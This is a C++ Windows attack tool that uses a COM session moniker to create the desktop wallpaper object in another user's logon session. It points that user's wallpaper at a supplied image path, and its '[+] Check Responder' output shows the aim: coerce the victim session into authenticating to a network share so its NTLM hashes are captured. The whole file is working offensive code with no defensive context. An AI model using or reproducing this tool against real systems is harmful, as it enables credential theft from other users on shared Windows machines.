#include <windows.h>
#include <shlobj.h>
#include <exdisp.h>
#include <mshtml.h>
#include <iostream>
#include <atlbase.h>
#include <strsafe.h>

HRESULT CoCreateInstanceInSession(DWORD session, REFCLSID rclsid, REFIID riid, void** ppv) {
    BIND_OPTS3 bo = {};
    WCHAR wszCLSID[50];
    WCHAR wszMonikerName[300];
    StringFromGUID2(rclsid, wszCLSID, _countof(wszCLSID));
    StringCchPrintf(wszMonikerName, _countof(wszMonikerName),
        L"session:%d!new:%s", session, wszCLSID);
    bo.cbStruct = sizeof(bo);
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
    return CoGetObject(wszMonikerName, &bo, riid, ppv);
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 3) {
        std::wcerr << L"Usage: " << argv[0] << L" <session> <image_path>" << std::endl;
        return 1;
    }

    DWORD session = _wtoi(argv[1]);
    const wchar_t* imagePath = argv[2];

    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        std::wcerr << L"CoInitialize failed with error: " << hr << std::endl;
        return 1;
    }

    CLSID clsidShellWindows;
    hr = CLSIDFromString(OLESTR("{C2CF3110-460E-4FC1-B9D0-8A1C0C9CC4BD}"), &clsidShellWindows);
    if (FAILED(hr)) {
        std::wcerr << L"CLSIDFromString failed with error: " << hr << std::endl;
        CoUninitialize();
        return 1;
    }

    IID iidIShellWindows;
    hr = IIDFromString(OLESTR("{B92B56A9-8B55-4E14-9A89-0199BBB6F93B}"), &iidIShellWindows);
    if (FAILED(hr)) {
        std::wcerr << L"IIDFromString failed with error: " << hr << std::endl;
        CoUninitialize();
        return 1;
    }

    IDesktopWallpaper* pDesktopWallpaper = nullptr;
    hr = CoCreateInstanceInSession(session, clsidShellWindows, iidIShellWindows, (void**)&pDesktopWallpaper);
    if (FAILED(hr)) {
        std::wcerr << L"CoCreateInstanceInSession failed with error: " << hr << std::endl;
        CoUninitialize();
        return 1;
    }

    UINT monitorCount;
    hr = pDesktopWallpaper->GetMonitorDevicePathCount(&monitorCount);
    if (FAILED(hr)) {
        std::wcerr << L"GetMonitorDevicePathCount failed with error: " << hr << std::endl;
        pDesktopWallpaper->Release();
        CoUninitialize();
        return 1;
    }

    for (UINT i = 0; i < monitorCount; i++) {
        LPWSTR monitorId;
        hr = pDesktopWallpaper->GetMonitorDevicePathAt(i, &monitorId);

        if (FAILED(hr)) {
            std::wcerr << L"GetMonitorDevicePathAt failed with error: " << hr << std::endl;
            continue;
        }

        hr = pDesktopWallpaper->SetWallpaper(monitorId, imagePath);
        std::wcout << L"[+] Check Responder" << std::endl;

        CoTaskMemFree(monitorId);
    }

    pDesktopWallpaper->Release();
    CoUninitialize();
    return 0;
}